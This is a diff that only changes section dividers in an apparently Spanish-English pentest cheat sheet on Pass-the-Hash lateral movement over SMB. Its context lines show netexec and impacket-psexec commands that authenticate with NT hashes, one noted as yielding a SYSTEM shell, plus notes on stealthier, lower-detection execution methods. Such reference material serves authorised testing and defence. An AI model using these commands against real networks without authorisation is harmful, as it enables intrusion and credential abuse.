@@ -21,7 +21,7 @@ linked:
 ---
 # Pass-the-Hash - SMB Lateral
 
-***
+---
 
 ## netexec / crackmapexec
 
@@ -49,7 +49,7 @@ nxc smb 10.10.10.5 -u administrator -H aabbccdd1122334455... --local-auth
 nxc smb 10.10.10.0/24 -u administrator -H aabbccdd... --local-auth | grep "Pwn3d"
 ```
 
-___
+---
 
 ## Impacket-PsExec
 
@@ -73,7 +73,7 @@ impacket-psexec -hashes :aabbccdd... corp.local/atacante@10.10.10.5
 # Output: SYSTEM shell interactive
 ```
 
-___
+---
 
 ## Impacket-WMIExec
 
@@ -92,7 +92,7 @@ ___
 - WMI events 5857/5858 si auditing habilitado.
 - Más silencioso que psexec — preferred método modern.
 
-___
+---
 
 ## Impacket-SMBExec
 
@@ -110,7 +110,7 @@ ___
 - Sin file drop = forensic-cleaner.
 - Slower que wmiexec por overhead service.
 
-___
+---
 
 ## Impacket-DComExec
 
@@ -130,7 +130,7 @@ ___
 - Output lectura via WMI namespace.
 - Menos detección signature.
 
-___
+---
 
 ## Impacket-AtExec
 
@@ -147,7 +147,7 @@ ___
 - Service-style detection signature.
 - Backup method.
 
-___
+---
 
 ## Method Comparison
 
@@ -165,7 +165,7 @@ ___
 - **dcomexec** = stealth max si DCOM access.
 - **psexec** = solo si otros bloqueados.
 
-___
+---
 
 ## Pre-PtH Validation
 
@@ -188,4 +188,4 @@ nxc smb $TARGET -u $USER -H $NT --shares  # share access
 nxc smb $TARGET -u $USER -H $NT --sessions  # sessions activas
 ```
 
-***
+---
